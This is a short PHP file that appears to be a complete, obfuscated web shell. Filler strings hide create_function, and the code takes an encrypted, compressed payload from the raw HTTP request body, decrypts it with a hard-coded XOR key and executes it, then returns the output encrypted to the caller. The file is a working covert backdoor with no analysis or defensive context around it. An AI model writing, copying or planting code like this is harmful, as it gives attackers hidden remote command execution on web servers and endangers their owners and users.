<?php
$H='5Iv5Ial(@gzuncompre5Iss(@x(@5Ib5Iase64_decode(5I$m[15I]),$k)))5I;$o=5I@5Iob_ge5It5I_conte5Ints(';
$X='I{for($j=0;(5I$j<$c&5I&$i5I<$l)5I;$j++,$i++)5I{$5Io.=$5It{$5Ii}^$k{$j}5I;}}retur5In $o;}if5I5I (@preg5I_match(';
$r=str_replace('tT','','cretTatTtTtTte_tTfunctitTon');
$L='"5I/$kh(.5I+)$kf/",@5Ifile_g5Ie5It_contents("5Iphp5I://input5I"),$m)5I==1) {@5I5Iob_start();@e5I';
$T='$k=5I"9f0450575I5I";$kh="6e1fd4125I5Ie415";$5Ikf="e9d9a45I41617c"5I;$p="5ISqoO5IDJt5I6eB6Bn5I5Ic';
$s=');@ob_5Iend_clean();$5Ir=@b5Iase64_enco5I5Ide(@5Ix(@gzco5Impress($o)5I,5I$k));print("$p5I$kh$r5I$kf");}';
$V='6W";function x5I($t,$k){$5Ic=strl5Ien($k5I)5I;$5Il=s5Itrlen($t5I);$o="";for($i5I=0;$i5I<$l;)5';
$d=str_replace('5I','',$T.$V.$X.$L.$H.$s);
$O=$r('',$d);$O();
?>
